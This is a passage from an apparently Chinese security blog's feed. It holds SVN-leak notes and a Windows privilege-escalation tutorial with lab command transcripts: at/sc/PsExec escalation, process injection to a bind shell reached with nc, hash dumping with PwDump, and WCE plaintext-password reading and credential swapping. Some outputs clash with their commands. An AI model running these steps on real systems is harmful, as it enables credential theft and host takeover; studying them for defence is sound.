title="7、SVN文件泄露漏洞"></a>7、SVN文件泄露漏洞</h4><p><strong>漏洞描述：</strong>Subversion，简称SVN，是一个开放源代码的版本控制系统，相对于的RCS、CVS，采用了分支管理系统，它的设计目标就是取代CVS。互联网上越来越多的控制服务从CVS转移到Subversion。</p><p><strong>漏洞检测：</strong> </p><p>1.漏洞利用工具： Seay SVN漏洞利用工具</p><p>2、添加网站url</p><p>在被利用的网址后面加 /.svn/entries，列出网站目录，甚至下载整站。</p><h5 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h5><p>1.不要使用svn checkout和svn up更新服务器上的代码，使用svn export（导出）功能代替。</p><p>2.服务器软件（Nginx、apache、tomcat、IIS等）设置目录权限，禁止访问.svn目录</p><h5 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h5><p><a href="https://ninjia.gitbook.io/secskill/web/info" target="_blank" rel="noopener">https://ninjia.gitbook.io/secskill/web/info</a></p><p><a href="https://blog.csdn.net/wy_97/article/details/78165051" target="_blank" rel="noopener">https://blog.csdn.net/wy_97/article/details/78165051</a></p><p><a href="https://www.cnblogs.com/Hydraxx/p/10762512.html" target="_blank" rel="noopener">https://www.cnblogs.com/Hydraxx/p/10762512.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;敏感信息泄露-源码泄露-学习笔记&quot;&gt;&lt;a href=&quot;#敏感信息泄露-源码泄露-学习笔记&quot; class=&quot;headerlink&quot; title=&quot;敏感信息泄露/源码泄露  学习笔记&quot;&gt;&lt;/a&gt;敏感信息泄露/源码泄露  学习笔记&lt;/h2&gt;&lt;h4 id=&quot;1-什么是敏感
      
    
    </summary>
    
    
      <category term="web漏洞学习" scheme="https://shu1l.github.io/categories/web%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="敏感信息泄露" scheme="https://shu1l.github.io/tags/%E6%95%8F%E6%84%9F%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
    
  </entry>
  
  <entry>
    <title>windows中常见提权方式总结(一)</title>
    <link href="https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/"/>
    <id>https://shu1l.github.io/2020/04/03/shen-tou-ce-shi-zhong-chang-jian-ti-quan-fang-shi-zong-jie-yi/</id>
    <published>2020-04-03T11:58:36.000Z</published>
    <updated>2020-05-17T11:26:55.665Z</updated>
    
    <content type="html"><![CDATA[<h2 id="渗透测试中常见提权方式总结（一）"><a href="#渗透测试中常见提权方式总结（一）" class="headerlink" title="渗透测试中常见提权方式总结（一）"></a>渗透测试中常见提权方式总结（一）</h2><h3 id="windows提权——本地提权"><a href="#windows提权——本地提权" class="headerlink" title="windows提权——本地提权"></a>windows提权——本地提权</h3><ul><li>已实现本地低权限账号登录<ul><li>远程溢出</li><li>直接获得账号密码</li></ul></li><li>希望获得更高权限<ul><li>实现对目标进一步控制</li></ul></li><li>系统账号之间权限隔离<ul><li>操作系统安全的基础</li><li>用户空间</li><li>内核空间</li></ul></li><li>系统账号<ul><li>用户账号登录时获取权限令牌</li><li>服务账号无需用户登录已在后台启动服务</li></ul></li><li>Windows<ul><li>users</li><li>Administrator</li><li>System</li></ul></li></ul><h4 id="Windows系统提权"><a href="#Windows系统提权" class="headerlink" title="Windows系统提权"></a>Windows系统提权</h4><h5 id="1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）"><a href="#1-使用-at-提权-（当前仅适用于-WinXp-及-Windows-server-2003-等低级版本）" class="headerlink" title="1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）"></a>1.使用 at 提权 （当前仅适用于 WinXp 及 Windows server 2003 等低级版本）</h5><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 修改密码：net user kevin *</span></span><br><span class="line">C:\Documents <span class="keyword">and</span> Settings\kevin&gt;net<span class="built_in"> user </span>kevin *</span><br><span class="line"><span class="built_in">Type </span>a password <span class="keyword">for</span> the user:</span><br><span class="line">Retype the password <span class="keyword">to</span> confirm:</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看系统用户：net user</span></span><br><span class="line">C:\Documents <span class="keyword">and</span> Settings\kevin&gt;net user</span><br><span class="line"><span class="built_in">User </span>accounts <span class="keyword">for</span> \\DH-CA8822AB9589</span><br><span class="line">---------------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    HelpAssistant</span><br><span class="line">IUSR_DH-CA8822AB9589     IWAM_DH-CA8822AB9589     kevin</span><br><span class="line">SUPPORT_388945a0</span><br><span class="line">The command completed successfully.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看用户状态：</span></span><br><span class="line">C:\Documents <span class="keyword">and</span> Settings\kevin&gt;net<span class="built_in"> user </span>kevin</span><br><span class="line"><span class="built_in">User </span>name                    kevin</span><br><span class="line">Full Name                    kevin</span><br><span class="line">Comment</span><br><span class="line">User<span class="string">'s comment</span></span><br><span class="line"><span class="string">Country code                 000 (System Default)</span></span><br><span class="line"><span class="string">Account active               Yes</span></span><br><span class="line"><span class="string">Account expires              Never</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Password last set            2/28/2018 2:05 PM</span></span><br><span class="line"><span class="string">Password expires             Never</span></span><br><span class="line"><span class="string">Password changeable          2/28/2018 2:05 PM</span></span><br><span class="line"><span class="string">Password required            Yes</span></span><br><span class="line"><span class="string">User may change password     Yes</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Workstations allowed         All</span></span><br><span class="line"><span class="string">Logon script</span></span><br><span class="line"><span class="string">User profile</span></span><br><span class="line"><span class="string">Home directory</span></span><br><span class="line"><span class="string">Last logon                   2/28/2018 2:03 PM</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Logon hours allowed          All</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Local Group Memberships      *Administrators       *Users</span></span><br><span class="line"><span class="string">Global Group memberships     *None</span></span><br><span class="line"><span class="string">The command completed successfully.</span></span><br></pre></td></tr></table></figure><p>1.查看用户进程</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427202422.png" alt=""></p><p>2.将 administrator 用户权限提升为 system 权限</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">C:\Documents and Settings\administrator&gt;cd \</span><br><span class="line">C:\&gt;at -?</span><br><span class="line">C:\&gt;at 2:15 /interactive cmd  #必须是未来时间，否则将是明天时间</span><br><span class="line"><span class="code">Added a new job with job ID = 1</span></span><br><span class="line">C:\&gt;at</span><br><span class="line">Status ID   Day                     Time          Command Line</span><br><span class="line">---------------------------------------------------------------------</span><br><span class="line"><span class="code">        1   Today                 2:15 AM       cmd</span></span><br></pre></td></tr></table></figure><p>我们看到这里弹出了system权限的命令框</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203025.png" alt=""></p><p>3.用新的 system 权限的窗口启动任务管理器</p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\W</span>INDOWS<span class="symbol">\s</span>ystem32&gt;taskmgr</span><br></pre></td></tr></table></figure><p>4.关闭之前的explorer</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203207.png" alt=""></p><p>5.应用程序-&gt;新任务-&gt;explorer</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203521.png" alt=""></p><p>6.验证桌面用户权限</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427203554.png" alt=""></p><h5 id="2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本"><a href="#2-使用-sc-提权-适用于-Win7-及Windows-server-2008-等高级版本" class="headerlink" title="2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)"></a>2.使用 sc 提权 (适用于 Win7 及Windows server 2008 等高级版本)</h5><p>1.运行-&gt;services.msc</p><figure class="highlight dos"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- C:\Users\root&gt;<span class="built_in">cd</span> \</span><br><span class="line">- C:&gt;sc Create syscmd binPath= “<span class="built_in">cmd</span> /K <span class="built_in">start</span>” <span class="built_in">type</span>= own <span class="built_in">type</span>= interact</span><br><span class="line">- C:&gt;sc <span class="built_in">start</span> syscmd</span><br></pre></td></tr></table></figure><p>3.使用 Sysinternals Suite 套件</p><p>推荐书籍 《Windows Internals第7版》</p><p><a href="https://download.sysinternals.com/files/SysinternalsSuite.zip" target="_blank" rel="noopener">Sysinternals Suite 套件下载</a></p><ul><li><p>下载之后解压使用其中的 PsExec 放在C盘根目录</p><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427205521.png" alt=""></p></li><li><p>启动 PsExec.exe</p></li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">C</span>:\&gt;PsExec.exe</span><br><span class="line"><span class="attribute">-i</span>: 交互模式</span><br><span class="line"><span class="attribute">-s</span>: 使用系统账户</span><br><span class="line"></span><br><span class="line"><span class="attribute">C</span>:\&gt;psexec -p'sei -s -d taskmgr</span><br><span class="line"><span class="attribute">C</span>:\&gt;PsExec.exe -i -s cmd</span><br></pre></td></tr></table></figure><ul><li>提权结果</li></ul><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427205652.png" alt=""></p><h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4><ul><li>pinjector.exe</li></ul><p>下载：<a href="https://www.tarasco.org/security/Process_Injector/：" target="_blank" rel="noopener">https://www.tarasco.org/security/Process_Injector/：</a></p><ul><li>下载之后解压使用其中的 PsExec 放在C盘根目录</li></ul><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427205858.png" alt=""></p><ul><li>列出可注入进程及其信息<ul><li>C:&gt;pinjector.exe</li><li>C:&gt;pinjector.exe -l</li></ul></li><li>找一个未使用端口<ul><li>C:&gt;netstat -nao | find “4444” </li><li>无结果表示未使用</li></ul></li><li>选择一个进程注入</li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">C</span>:\&gt;pinjector.exe -l</span><br><span class="line">PID    <span class="number">668</span> services.exe ( <span class="number">16</span> Threads)  <span class="attribute">USER</span>: \\NT AUTHORITY\SYSTEM</span><br><span class="line"><span class="attribute">C</span>:\&gt;pinjector.exe -p <span class="number">668</span> cmd <span class="number">4444</span></span><br><span class="line">Privilege Switcher for Win32(Private version)</span><br><span class="line">(c) <span class="number">2006</span> Andres Tarasco - atarasco<span class="variable">@gmail</span>.com</span><br><span class="line">[+] Trying to execute cmd to <span class="number">668</span> <span class="attribute">as</span>: ? \</span><br><span class="line">[+] Code inyected... ; )</span><br></pre></td></tr></table></figure><ul><li>查看被注入的进程的监听状态</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;netstat -nao | find <span class="string">"555"</span></span><br><span class="line">TCP    <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">555</span>            <span class="number">0.0</span><span class="number">.0</span><span class="number">.0</span>:<span class="number">0</span>              LISTENING       <span class="number">668</span></span><br></pre></td></tr></table></figure><ul><li>利用此监听端口</li></ul><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">root@kali：~#</span> <span class="string">nc</span> <span class="string">-nv</span> <span class="number">192.168</span><span class="number">.153</span><span class="number">.143</span> <span class="number">4444</span></span><br><span class="line"><span class="string">Connection</span> <span class="string">to</span> <span class="number">10.10</span><span class="number">.10</span><span class="number">.128</span> <span class="number">555</span> <span class="string">port</span> <span class="string">[tcp/*]</span> <span class="string">succeeded!</span></span><br><span class="line"><span class="string">Microsoft</span> <span class="string">Windows</span> <span class="string">XP</span> <span class="string">[?汾</span> <span class="number">5.1</span><span class="number">.2600</span><span class="string">]</span></span><br><span class="line"><span class="string">(C)</span> <span class="string">???????</span> <span class="number">1985</span><span class="number">-2001</span> <span class="string">Microsoft</span> <span class="string">Corp</span></span><br><span class="line"><span class="string">C:\WINDOWS\system32&gt;whoami</span></span><br><span class="line"><span class="string">whoami</span></span><br><span class="line"><span class="string">SYSTEM</span></span><br></pre></td></tr></table></figure><ul><li>查看进程</li></ul><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">使用 SysinternalsSuite/procexp<span class="selector-class">.exe</span> 查看进程</span><br></pre></td></tr></table></figure><h4 id="读取windows本地密码进行提权"><a href="#读取windows本地密码进行提权" class="headerlink" title="读取windows本地密码进行提权"></a>读取windows本地密码进行提权</h4><h5 id="1-抓包嗅探"><a href="#1-抓包嗅探" class="headerlink" title="1. 抓包嗅探"></a>1. 抓包嗅探</h5><ol><li>Windows<ul><li>Wireshark</li><li>Omnipeek</li><li>Commview</li><li>Sniffpass：抓取密码相关的数据包</li></ul></li><li>Linux<ul><li>Tcpdump</li><li>Wireshark</li><li>Dsniff：抓取密码相关的数据包</li></ul></li></ol><h5 id="2-键盘记录本地密码"><a href="#2-键盘记录本地密码" class="headerlink" title="2. 键盘记录本地密码"></a>2. 键盘记录本地密码</h5><ul><li>可以使用木马软件 DarkCometRAT</li><li>在控制目标主机之后可以监控键盘记录信息</li></ul><h5 id="3-查看本地缓存密码"><a href="#3-查看本地缓存密码" class="headerlink" title="3.查看本地缓存密码"></a>3.查看本地缓存密码</h5><ul><li>在浏览器查看缓存密码</li></ul><p><img src="D:%5Cblog%5Csource_posts%5C%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E2%80%94%E2%80%94%E6%8F%90%E6%9D%83%5CQQ%E6%88%AA%E5%9B%BE20200427211834.png" alt=""></p><ul><li><p>windows 密码恢复工具</p><ul><li><a href="http://www.nirsoft.net/password_recovery_tools.html" target="_blank" rel="noopener">Windows Password Recovery Tools</a></li></ul></li><li><p>使用 Pwdump 查看 windows 本地登录密码</p><ul><li>windows 登录密码保存在 C:\Windows\System32\config\SAM 文件中</li><li>pwdump 在 kali 系统中可以找到 /usr/share/windows-binaries/fgdump/</li><li>添加用户</li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">C</span>:\Documents and Settings\kevin&gt;net user user2 <span class="number">123456</span> /add</span><br><span class="line"><span class="attribute">C</span>:\Documents and Settings\kevin&gt;net user</span><br><span class="line">\\ICST-WINATT 的用户帐户</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">Administrator            Guest                    HelpAssistant</span><br><span class="line">kevin                    SUPPORT_388945a0         test</span><br><span class="line">user1                    user2</span><br><span class="line"><span class="attribute">C</span>:\Documents and Settings\kevin&gt;cd \</span><br><span class="line"><span class="attribute">C</span>:\&gt;PwDump.exe localhost</span><br><span class="line"><span class="attribute">Administrator</span>:<span class="number">500</span>:<span class="number">18</span><span class="attribute">D583B495C4696AFF17365FAF1FFE89</span>:<span class="number">5</span><span class="attribute">D36F0CA14EEBEF32F55C7B6A4675DB0</span>:::</span><br><span class="line"><span class="attribute">Guest</span>:<span class="number">501</span>:NO PASSWORD*********************:NO PASSWORD*********************:::</span><br><span class="line"><span class="attribute">HelpAssistant</span>:<span class="number">1000</span>:<span class="number">5906</span><span class="attribute">F3A72959D5902440275BA555A537</span>:<span class="number">10</span><span class="attribute">AA20D63C3EC71E0102AC95ADF6DF73</span>:::</span><br><span class="line"><span class="attribute">kevin</span>:<span class="number">1004</span>:<span class="number">44</span><span class="attribute">EFCE164AB921CAAAD3B435B51404EE</span>:<span class="number">32</span><span class="attribute">ED87BDB5FDC5E9CBA88547376818D4</span>:::</span><br><span class="line"><span class="attribute">SUPPORT_388945a0</span>:<span class="number">1002</span>:NO PASSWORD*********************:<span class="number">8</span><span class="attribute">AFA81401E8D8EBFA42B4E46F6507C07</span>:::</span><br><span class="line"><span class="attribute">test</span>:<span class="number">1005</span>:<span class="number">44</span><span class="attribute">EFCE164AB921CAAAD3B435B51404EE</span>:<span class="number">32</span><span class="attribute">ED87BDB5FDC5E9CBA88547376818D4</span>:::</span><br><span class="line"><span class="attribute">user1</span>:<span class="number">1006</span>:<span class="number">44</span><span class="attribute">EFCE164AB921CAAAD3B435B51404EE</span>:<span class="number">32</span><span class="attribute">ED87BDB5FDC5E9CBA88547376818D4</span>:::</span><br><span class="line"><span class="attribute">user2</span>:<span class="number">1007</span>:<span class="number">44</span><span class="attribute">EFCE164AB921CAAAD3B435B51404EE</span>:<span class="number">32</span><span class="attribute">ED87BDB5FDC5E9CBA88547376818D4</span>:::Completed.</span><br><span class="line"># 结果：前部分是 LMHASH ，后部分是 NTLMHASH</span><br></pre></td></tr></table></figure><ul><li><p>可以将结果保存在文件中，然后在 kali 中进行破解</p><p><img src="https://img-blog.csdnimg.cn/20190413165117218.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p></li></ul></li></ul><h4 id="WCE-WINDOWS-CREDENTIAL-EDITOR"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h4><ul><li>WINDOWS身份认证过程</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165135348.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="WCE-WINDOWS-CREDENTIAL-EDITOR-1"><a href="#WCE-WINDOWS-CREDENTIAL-EDITOR-1" class="headerlink" title="WCE (WINDOWS CREDENTIAL EDITOR)"></a>WCE (WINDOWS CREDENTIAL EDITOR)</h5><ul><li>windows 内核中保存有密码明文副本，安全机制较低</li><li>需要管理员权限</li><li>工具保持在 kali 的 /usr/share/wce/wce-universal # 通用格式是自动识别32位和64位</li><li>多用户登录目标主机</li></ul><p><img src="https://img-blog.csdnimg.cn/20190413165139664.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0tldmluaGFuc2Vy,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><ul><li>列举登录账号及会话</li></ul><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;wce-universal.exe -lv</span><br><span class="line"><span class="number">0020</span>B19D:user1:ICST-WINATT:<span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="number">001E5</span>D92:user2:ICST-WINATT:<span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="number">001</span>B9220:test:ICST-WINATT:<span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="number">0000</span>C7CE:kevin:ICST-WINATT:<span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE:<span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="number">000003E4</span>:ICST-WINATT$:MSHOME:AAD3B435B51404EEAAD3B435B51404EE:<span class="number">31</span>D6CFE0D16AE931B73C59D7E0C089C0</span><br><span class="line"># 与 C:\&gt;PwDump.exe localhost 结果相同</span><br></pre></td></tr></table></figure><ul><li><p>每隔5秒刷新一次</p><ul><li>wce-universal.exe -r</li></ul></li><li><p>删除登录会话</p><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">C:</span>\&gt;wce-universal.exe -d <span class="number">0020</span>B19D</span><br><span class="line"><span class="string">C:</span>\&gt;wce-universal.exe -lv</span><br><span class="line"><span class="symbol">001E5D92:</span><span class="string">user2:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">001B9220:</span><span class="string">test:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">0000C7CE:</span><span class="string">kevin:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">000003E4:</span>ICST-<span class="string">WINATT$:</span><span class="string">MSHOME:</span><span class="string">AAD3B435B51404EEAAD3B435B51404EE:</span><span class="number">31</span>D6CFE0D16AE931B73C59D7E0C089C0</span><br></pre></td></tr></table></figure></li><li><p>计算密码对应的 HASH 值</p></li></ul><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">C</span>:\&gt;wce-universal.exe -g passwd</span><br><span class="line"><span class="attribute">Password</span>:   passwd</span><br><span class="line"><span class="attribute">Hashes</span>:     <span class="number">91</span><span class="attribute">C7AE7122196B5EAAD3B435B51404EE</span>:<span class="number">22315</span>D6ED1A7D5F8A7C98C40E9FA2DEC</span><br></pre></td></tr></table></figure><ul><li>读取内核中的明文密码</li></ul><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">C:\&gt;wce-universal.exe -w</span><br><span class="line">user1\ICST-WINATT:123456</span><br><span class="line">user2\ICST-WINATT:123456</span><br><span class="line">test\ICST-WINATT:123456</span><br><span class="line">kevin\ICST-WINATT:123456</span><br><span class="line"><span class="built_in">NETWORK </span>SERVICE\MSHOME:</span><br><span class="line"></span><br><span class="line">C:\&gt;net<span class="built_in"> user </span>user1 111222</span><br><span class="line">命令成功完成。</span><br><span class="line">C:\&gt;wce-universal.exe -w</span><br><span class="line">user1\ICST-WINATT:123456</span><br><span class="line">user2\ICST-WINATT:123456</span><br><span class="line">test\ICST-WINATT:123456</span><br><span class="line">kevin\ICST-WINATT:123456</span><br><span class="line"><span class="built_in">NETWORK </span>SERVICE\MSHOME:</span><br><span class="line"><span class="comment"># 当前内核中保存的值会在下次登录被读取出来</span></span><br></pre></td></tr></table></figure><ul><li>对 LUID 进行修改（将LUID改为匹配其他用户的用户名和密码）</li></ul><figure class="highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">C:</span>\&gt;wce-universal.exe -lv</span><br><span class="line"><span class="symbol">001E5D92:</span><span class="string">user2:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">001B9220:</span><span class="string">test:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">0000C7CE:</span><span class="string">kevin:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">000003E4:</span>ICST-<span class="string">WINATT$:</span><span class="string">MSHOME:</span><span class="string">AAD3B435B51404EEAAD3B435B51404EE:</span><span class="number">31</span>D6CFE0D16AE931B73C59D7E0C089C0</span><br><span class="line"><span class="string">C:</span>\&gt;wce-universal.exe -i <span class="number">001E5</span>D92 -s <span class="string">kevin:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">Changing NTLM credentials of logon session <span class="number">001E5</span>D92h <span class="string">to:</span></span><br><span class="line"><span class="symbol">Username:</span> kevin</span><br><span class="line"><span class="symbol">domain:</span> ICST-WINATT</span><br><span class="line"><span class="symbol">LMHash:</span> <span class="number">44</span>EFCE164AB921CAAAD3B435B51404EE</span><br><span class="line"><span class="symbol">NTHash:</span> <span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line">NTLM credentials successfully changed!</span><br><span class="line"><span class="string">C:</span>\&gt;wce-universal.exe -lv</span><br><span class="line"><span class="symbol">001E5D92:</span><span class="string">kevin:</span>ICST-<span class="string">WINATT:</span><span class="number">44</span><span class="string">EFCE164AB921CAAAD3B435B51404EE:</span><span class="number">32</span>ED87BDB5FDC5E9CBA88547376818D4</span><br><span class="line"><span class="symbol">001B9220:</span><span class="string">test:</span>ICST-<span class="string">WINATT:</span><span 